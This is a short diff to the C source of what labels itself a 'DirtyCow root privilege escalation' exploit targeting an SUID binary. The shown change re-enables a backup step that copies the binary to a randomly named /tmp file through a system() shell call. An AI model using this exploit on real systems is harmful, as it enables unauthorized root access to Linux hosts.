@@ -26,6 +26,7 @@
 #include <pthread.h>
 #include <string.h>
 #include <unistd.h>
+#include <time.h>
  
 void *map;
 int f;
@@ -131,10 +132,11 @@ int main(int argc,char *argv[]) {
     char *backup;
  
     printf("DirtyCow root privilege escalation\n");
-    //printf("Backing up %s.. to /tmp/bak\n", suid_binary);
- 
-    //asprintf(&backup, "cp %s /tmp/bak", suid_binary);
-    //system(backup);
+    printf("Backing up %s.. to /tmp/bak\n", suid_binary);
+    srand(time(NULL));
+    
+    asprintf(&backup, "cp %s /tmp/bak%d", suid_binary,rand());
+    system(backup);
  
     f = open(suid_binary,O_RDONLY);
     fstat(f,&st);
